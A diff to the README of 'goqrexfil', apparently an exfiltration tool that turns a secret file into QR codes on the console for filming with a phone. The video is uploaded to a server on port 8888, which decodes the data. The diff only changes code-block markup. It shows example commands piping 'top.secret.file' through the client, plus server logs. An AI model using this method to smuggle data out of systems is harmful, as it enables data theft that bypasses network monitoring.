@@ -17,7 +17,7 @@
 2. start a video recording with phone, point at the shell window
 
 Example:
-`
+```
 ➜ cat top.secret.file | ./goqrexfil --client
 -= goqrexfil =-
 [*] Client mode: ON
@@ -25,7 +25,7 @@ Example:
 
 
 ---=== 5 seconds to use CTRL+C if you want to abort ===---
-`
+```
 Start recording a video now, QR codes will be displayed on the console and stop the video at the end.
 
 ## Have server ready to receive and process your video
@@ -33,7 +33,7 @@ Start recording a video now, QR codes will be displayed on the console and stop 
 2. From your phone, go to your server domain/ip on port 8888 e.g. http://1.2.3.4:8888/ and upload the video:
 
 Example:
-`➜ ./goqrexfil -server
+```➜ ./goqrexfil -server
 -= goqrexfil =-
 [*] Server mode: ON
 2020/04/25 11:42:15
@@ -47,10 +47,10 @@ public/005.png has payload.. Adding
 [GIN] 2020/04/25 - 11:42:19 | 200 |  4.336634181s |    172.16.0.110 | POST     "/upload"
 
 ^C⏎
-`
+```
 
 ## Retrieving payload
-`➜ cat payload.raw
+```➜ cat payload.raw
 ------------|
 
 
@@ -69,4 +69,4 @@ start writing basic IRIX shellcode.  It is divided into the following sections:
     - MIPS archstages the MIPS design
       has reflected this on the instructions itself: every instruction is
       32 bits broad (4 bytes), and can be divided most of the times into
-      segments which correspond with each pipestage..`
+      segments which correspond with each pipestage..```
